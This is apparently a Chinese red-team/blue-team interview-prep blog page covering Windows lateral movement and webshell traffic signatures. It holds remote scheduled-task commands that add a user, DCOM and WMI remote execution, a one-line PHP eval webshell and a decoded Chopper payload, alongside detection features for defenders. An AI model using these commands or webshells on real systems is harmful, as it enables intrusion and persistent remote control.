<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立IPC连接</span></span><br><span class="line">net use \\\\ IP \ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="at-schtasks"><a href="#at-schtasks" class="headerlink" title="at&#x2F;schtasks"></a>at&#x2F;schtasks</h3><p>at命令在2012之前的系统使用，后面的系统使用schtasks代替</p>
<p>条件：开启了139，445端口，获取了其他主机的明文密码或者hash值</p>
<p>at传递</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">建立ipc连接：net ``use` `\192.168.213.163ipc$ ``<span class="string">&quot;123.com&quot;</span>` `/user:hsyy.comadministrator</span><br><span class="line">本地制作user.bat文件放在本地c盘执行命令脚本：net user haha 123.com /add</span><br><span class="line">将文件上传到对方主机C 盘：``copy` `user.bat \192.168.213.163c$</span><br><span class="line">给对方主机添加命令执行任务：at \192.168.213.163 12:20 c:user.bat</span><br><span class="line">等待后查看到对方主机添加用户haha</span><br></pre></td></tr></table></figure>

<p>schtasks传递</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">创建ipc连接：net ``use` `\192.168.213.163ipc$ ``<span class="string">&quot;123.com&quot;</span>` `/user:hsyy.comadministrator</span><br><span class="line">复制脚本bat文件：``copy` `user.bat \192.168.213.163c$</span><br><span class="line">创建 adduser 任务对应执行文件：schtasks /create /s 192.168.213.163 /ru ``<span class="string">&quot;SYSTEM&quot;</span>` `/tn adduser /sc DAILY /tr c:user.bat /F</span><br><span class="line">执行文件任务：schtasks /run /s 192.168.213.163 /tn adduser /i</span><br><span class="line">删除执行文件任务：schtasks /delect /s 192.168.213.163 /tn adduser /f</span><br></pre></td></tr></table></figure>

<h3 id="pth-ptk-ptt-1"><a href="#pth-ptk-ptt-1" class="headerlink" title="pth ptk ptt"></a>pth ptk ptt</h3><p>常见的有黄金&#x2F;白银票据，哈希传递，ms14-068等，可利用mimikatz</p>
<h3 id="dcom组件"><a href="#dcom组件" class="headerlink" title="dcom组件"></a>dcom组件</h3><p>DCOM（分布式组件对象模型,分布式组件对象模式）是一系列微软的概念和程序接口，利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。DCOM基于组件对象模型（COM），COM提供了一套允许同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95或者其后的版本上）。</p>
<p>并不是所有dcom组件都可以执行命令，目前网络上大多使用的是<code>MMC20.APPLICATION</code>来进行横向移动。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &#x27;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\&#123;49B2791A-B1AE-4C90-9B8E-E860BA07F889&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/webp.webp" alt="img"></p>
<p>执行远程命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;10.92.XXX.XX&quot;)).Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname calc.exe&quot;,&quot;7&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/image/webp.webp" alt="img"></p>
<p><img src="/image/webp-1700808110529-7.webp" alt="img"></p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>windows SysinternalsSuite攻击套件中的一员，由于文件拥有微软的签名，所以很多杀软都会放行，但是行为很容易检测。metasploit中也集成了psexec工具模块，其实原理是一样的。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用：PsExec64.exe \\HOST -u USERNAME -p PASSWORD COMMAND</span><br></pre></td></tr></table></figure>

<h3 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h3><p>WMI，是Windows 2K&#x2F;XP管理系统的核心；对于其他的Win32操作系统，WMI是一个有用的插件。WMI以CIMOM为基础，CIMOM即公共信息模型对象管理器（Common Information Model Object Manager），是一个描述操作系统构成单元的对象数据库，为MMC和脚本程序提供了一个访问操作系统构成单元的公共接口。有了WMI，工具软件和脚本程序访问操作系统的不同部分时不需要使用不同的API。如今大部分WINDOWS版本的机器都内置了WMI组件，所以利用WMI横向移动是一件很方便的事情。</p>
<p>使用： <code>wmic /node:IP /user:USERNAME /password:PASSWORD process list brief</code></p>
<p>执行命令: <code>wmic /node:IP /user:USERNAME /password:PASSWORD process call create &quot;cmd.exe /c tasklist&quot;</code></p>
<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p>Windows 远程管理 (WinRM) 是微软对 WS-Management Protocol（Web Services for Management aka WSMan）的实现，这是一种基于标准简单对象访问协议 (SOAP) 的防火墙友好协议，它允许来自不同硬件和操作系统的供应商，进行互操作。WinRM HTTP 通信通过 TCP 端口 5985 进行，HTTPS (TLS) 通信通过 TCP 端口 5986 进行。WinRM 本身支持 NTLM 和 Kerberos（域）身份验证。初始身份验证后，WinRM 会话受 AES 加密保护。</p>
<h3 id="域内密码喷洒脚本"><a href="#域内密码喷洒脚本" class="headerlink" title="域内密码喷洒脚本"></a>域内密码喷洒脚本</h3><p>用多个弱密码连续爆破同一个服务器会触发策略而锁定登录，这时候可以通过写脚本以一组弱密码批量撞多个服务器（故叫做喷洒脚本）</p>
<h3 id="窃取管理员token横向"><a href="#窃取管理员token横向" class="headerlink" title="窃取管理员token横向"></a>窃取管理员token横向</h3><h2 id="流量特征-webshell客户端等"><a href="#流量特征-webshell客户端等" class="headerlink" title="流量特征 webshell客户端等"></a>流量特征 webshell客户端等</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>webshell源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>请求侧通信流量</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>1*.***.*.***</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1*.***.*.***</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1*.***.*.***</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>690</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=m4mi07jn4u6cd3gmhdt97fmq55</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">cmd=<span class="meta">%</span><span class="number">40</span>eval<span class="meta">%</span><span class="number">01</span><span class="meta">%</span><span class="number">28</span>base<span class="number">64</span>_decode<span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">24</span>_POST<span class="meta">%</span><span class="number">5</span>Bz<span class="number">0</span><span class="meta">%</span><span class="number">5</span>D<span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">3</span>B&amp;z<span class="number">0</span>=QGluaV<span class="number">9</span>zZXQoImRpc<span class="number">3</span>BsYXlfZXJyb<span class="number">3</span>JzIiwiMCIp<span class="meta">O0</span>BzZXRfdGltZV<span class="number">9</span>saW<span class="number">1</span>pdCgwKTtAc<span class="number">2</span>V<span class="number">0</span>X<span class="number">21</span>hZ<span class="number">2</span>ljX<span class="number">3</span>F<span class="number">1</span>b<span class="number">3</span>Rlc<span class="number">19</span>ydW<span class="number">50</span>aW<span class="number">1</span>lKDAp<span class="meta">O2</span>Vja<span class="name">G8</span>oIi<span class="number">0</span><span class="meta">%</span><span class="number">2</span>BfCIpOzskRD<span class="number">1</span>kaXJuYW<span class="number">1</span>lKCRfU<span class="number">0</span><span class="attr">VSVkVSWyJTQ1</span>JJUFRfRklMRU<span class="number">5</span>BTUUiXSk<span class="number">7</span>aWYoJEQ<span class="number">9</span>PSIiKSREPWRpc<span class="name">m5</span>hbWUoJF<span class="number">9</span>TRVJWRVJbIlBBVEhfVFJBTl<span class="symbol">NMQVRFRCJdKTskUj0</span>ieyREfVx<span class="number">0</span>IjtpZihzdWJzdHIoJEQsMCwxKSE<span class="number">9</span>Ii<span class="number">8</span>iKXtmb<span class="number">3</span>JlYW<span class="symbol">NoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2</span>RpcigieyRMfToiKSkkUi<span class="number">49</span>I<span class="symbol">nskTH06</span>Ijt<span class="number">9</span>JFIuPSJcdCI<span class="number">7</span>JHU<span class="number">9</span>KGZ<span class="number">1</span>bm<span class="symbol">N0</span>aW<span class="number">9</span>uX<span class="number">2</span>V<span class="number">4</span>aX<span class="symbol">N0</span>cyg<span class="symbol">ncG9</span>zaXhfZ<span class="number">2</span>V<span class="number">0</span>ZWdpZCcpKT<span class="number">9</span>Ac<span class="name">G9</span>zaXhfZ<span class="number">2</span>V<span class="number">0</span>cHd<span class="number">1</span>aWQoQHB<span class="attr">vc2</span>l<span class="number">4</span>X<span class="number">2</span>dldGV<span class="number">1</span>aWQoKSk<span class="number">6</span>Jyc<span class="number">7</span>JHVzcj<span class="number">0</span>oJHUpPyR<span class="number">1</span>WyduYW<span class="number">1</span>lJ<span class="number">106</span>QGdldF<span class="number">9</span>jdXJyZW<span class="number">50</span>X<span class="number">3</span>VzZXIoKTskUi<span class="number">49</span>cGhwX<span class="number">3</span>VuYW<span class="number">1</span>lKCk<span class="number">7</span>JFIuPSIoeyR<span class="number">1</span>c<span class="number">3</span>J<span class="number">9</span>KSI<span class="number">7</span>cHJpb<span class="symbol">nQgJFI7</span><span class="meta">O2</span>Vja<span class="name">G8</span>oI<span class="symbol">nw8</span>LSIp<span class="meta">O2</span>RpZSgpOw<span class="meta">%</span><span class="number">3</span>D<span class="meta">%</span><span class="number">3</span>D</span></span><br></pre></td></tr></table></figure>

<p>流量解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@eval.(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure>

<p>响应侧通信流量</p>
<p><img src="/image/20210410231149-13042956-9a0f-1.jpg" alt="img"></p>
<p><strong>总结</strong></p>
<ul>
<li>请求侧通信流量存在<code>@eval</code>函数</li>
<li>请求侧流量使用的是base64编码，并且头部有固定QG字段</li>
<li>请求侧默认攻击载荷为z1或者z0</li>
<li>响应侧流量一般包裹在<code>-&gt;|xxxx|&lt;-</code>当中</li>
</ul>
<h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p>webshell源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span>  <span class="comment">#蚁剑不同的编码器会有不同的代码，这里以普通的分析</span></span><br></pre></td></tr></table></figure>

<p>编码器在发送数据到服务端之前对payload进行相关处理，目的是为了绕过请求侧的流量检测，默认的有：</p>
<ul>
<li>default编码器：不对传输的payload进行任何操作。</li>
<li>base64编码器：对payload进行base64编码。</li>
<li>chr编码器：对payload的所有字符都利用利用chr函数进行转换。</li>
<li>chr16编码器：对payload的所有字符都利用chr函数转换，与chr编码器不同的是chr16编码器对chr函数传递的参数是十六进制。</li>
<li>rot13编码器：对payload中的字母进行rot13转换。</li>
<li>以上五种编码为中国蚁剑自带的，不需要配置就可以直接使用，除此之外，还存在一个RSA编码器，该编码器将</li>
<li>RSA编码器：该编码器默认不展示，需要自己配置。配置方法：在编码管理界面点击生成RSA配置生成公钥、私钥和PHP代码，然后点击新建编码器选择PHP RSA之后输入编码器的名字即可。</li>
</ul>
<p>解码器主要是对接收到的数据进相关处理，目的是为了绕过响应侧的流量检测，默认的解码器：</p>
<ul>
<li>default解码器：不对响应数据进行处理。</li>
<li>base64解码器：将收到的数据进行base64解码。</li>
<li>rot13解码器：将收到的数据进行rot13转换，由于英文字母一共26个所以置换两次之后会还原。</li>
</ul>
<p>请求侧通信流量</p>
<p>默认编码器发送的数据如下：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231150-138e05d6-9a0f-1.jpg"><img src="/image/20210410231150-138e05d6-9a0f-1.jpg" alt="img"></a></p>
<p>base64编码器发送数据如下：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13b74b76-9a0f-1.jpg"><img src="/image/20210410231151-13b74b76-9a0f-1.jpg" alt="img"></a></p>
<p>chr：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-13fa7aea-9a0f-1.jpg"><img src="/image/20210410231151-13fa7aea-9a0f-1.jpg" alt="img"></a></p>
<p>chr16：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231151-14398fe6-9a0f-1.jpg"><img src="/image/20210410231151-14398fe6-9a0f-1.jpg" alt="img"></a></p>
<p>rot13:</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-1461fa6c-9a0f-1.jpg"><img src="/image/20210410231152-1461fa6c-9a0f-1.jpg" alt="img"></a></p>
<p>rsa:</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-148de50a-9a0f-1.jpg"><img src="/image/20210410231152-148de50a-9a0f-1.jpg" alt="img"></a></p>
<p>响应侧流量</p>
<p>default：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14ae1dac-9a0f-1.jpg"><img src="/image/20210410231152-14ae1dac-9a0f-1.jpg" alt="img"></a></p>
<p>base64：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231152-14cd88fe-9a0f-1.jpg"><img src="/image/20210410231152-14cd88fe-9a0f-1.jpg" alt="img"></a></p>
<p>rot13：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210410231153-14ee819e-9a0f-1.jpg"><img src="/image/20210410231153-14ee819e-9a0f-1.jpg" alt="img"></a></p>
<p><strong>总结</strong></p>
<ul>
<li>使用对应的编码器编码算法进行解码</li>
<li>php使用assert和eval；asp使用eval；jsp使用classloader加载</li>
<li>文件操作的流量，会有_0x开头的参数，与编码器无关</li>
</ul>
<h3 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h3><p>webshell源码</p>
<img src="/image/20210405205409-03663e4e-960e-1.png" alt="img" style="zoom: 50%;" />

<p>分析：</p>
<p>首先对get传入的参数pass进行检查，如果存在则以时间方式生成一个长度16的key存入到session中；再判断是否开启openssl拓展，如果开启了就会进行AES解密得到<strong>中继字符串</strong>，即<code>assert|eval(&quot;phpinfo();&quot;)</code>，这是固定定义好的；接着用explode函数拆分中继字符串为字符串数组；再以可变函数的形式，以索引为0的数组元素调用索引为1的数组元素，即<code>assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)</code>；如果没有开启openssl拓展，则进行异或处理然后base64加密。</p>
<p>流量分析</p>
<p><img src="/image/20210405205439-1566c91a-960e-1.jpg" alt="img"></p>
<p>首先发送了两次get请求，第一次请求对应刚刚的16位key并写入session中，与当前会话绑定；第二次请求则获取key，此时的key为解密的key，解密出来的内容还有一层base64编码</p>
<p>是否开启openssl</p>
<p><img src="/image/20210405205532-34dab842-960e-1.png" alt="img"></p>
<p><strong>总结</strong></p>
<ul>
<li>采用AES对称加密</li>
<li>采用密钥协商机制，第一阶段返回200和16位明文连接密码</li>
<li>建立连接之后的所有请求cookie格式都为path&#x3D;&#x2F;；</li>
<li>php中存在eval和assert等字符特征</li>
<li>asp中会在for循环中进行异或处理</li>
<li>jsp中存在classloader和getclass().getclassloader()等字符特征</li>
</ul>
<p><img src="/image/image-20220605203147800.png" alt="image-20220605203147800"></p>
<h3 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h3><p><strong>总结</strong></p>
<ul>
<li>内置默认的十六种ua头（可更改）</li>
<li>交流无明文，采用预共享密钥</li>
<li>默认的webshell存在16位数的连接密码(md5 32位的前16，默认密码明文为rebeyond)</li>
<li>在建立连接后使用命令执行功能时，请求包中content-length为5740或5720</li>
<li>每一个请求头中存在Pragma:no-cache,cache-control:no-cache</li>
</ul>
<p><img src="/image/image-20220605203138996.png" alt="image-20220605203138996"></p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p><strong>总结</strong></p>
<ul>
<li>base64加密</li>
<li>php，asp都有eval；jsp有sc，pass，classloader，getclass().getclassloader()等</li>
<li>响应头部中大部分存在cache-control:no-store，no-cache，must-revalidate</li>
<li>cookie值的最后都以”；”结尾</li>
<li>生成的shell因为使用了TCP长连接会生成3个http包：第一个包发送一长段payload，一般是一个变量加上一堆加密过后的值，且http的响应为空；第二个包发送一段与先前的变量名相同，加一串密文，解密之后可以获得methodName&#x3D;test，目的是为了测试shell的连通情况，并给客户端打印ok，内容固定；第三个包发送类似第二个包，加密的内容从test变成了getBasicsInfo，用于调用之前payload的内容将目标环境信息向客户端返回。</li>
</ul>
<p><img src="/image/image-20220605203120830.png" alt="image-20220605203120830"></p>
<h2 id="Webshell客户端使用上的区别"><a href="#Webshell客户端使用上的区别" class="headerlink" title="Webshell客户端使用上的区别"></a>Webshell客户端使用上的区别</h2><ul>
<li>蚁剑：有多种编码器&#x2F;解码器，可进行流量混淆绕过waf，开源可自行编写插件</li>
<li>冰蝎：</li>
</ul>
<h2 id="sqlmap-–os-shell原理"><a href="#sqlmap-–os-shell原理" class="headerlink" title="sqlmap –os-shell原理"></a>sqlmap –os-shell原理</h2><ul>
<li>知道网站物理路径</li>
<li>拥有sa权限</li>
<li>secure_file_priv无限制</li>
<li>网站路径有写入权限</li>
</ul>
<h2 id="护网小作文系列（雾"><a href="#护网小作文系列（雾" class="headerlink" title="护网小作文系列（雾"></a>护网小作文系列（雾</h2><h3 id="溯源经历"><a href="#溯源经历" class="headerlink" title="溯源经历"></a>溯源经历</h3><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>首先在目标站点的首页上发现存在在线客服站点，通过钓鱼下木马拿到了客服个人PC权限，并且该pc处于cloud.local域内，通过对该域的信息搜集发现了VMware Horizon服务器，对其进行了分析，发现其所在的版本8.0处于Log4j2远程代码执行漏洞（CVE-2021-44228）的影响范围中，通过该漏洞写入内存马成功拿到该服务器权限，从该服务器横向移动拿到了域控主机权限，通过域控获取到了域下的vcenter服务器从vcenter后台发现了运维机，经分析发现存在CVE-2021-22005任意文件上传漏洞，通过上传木马拿到了运维机的权限，接着获取到了本地rdp联机密码以及NTLM凭据，由此进一步拿到了另一台FTP服务器，扫描同网段获取到了第二台vcenter服务器地址，同样存在CVE-2021-22005任意文件上传漏洞，上传木马拿到第二台vcenter后台，通过console口上线</p>
]]></content>
      <categories>
        <category>面经</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>hvv</tag>
        <tag>面经</tag>
      </tags>
  </entry>
</search>
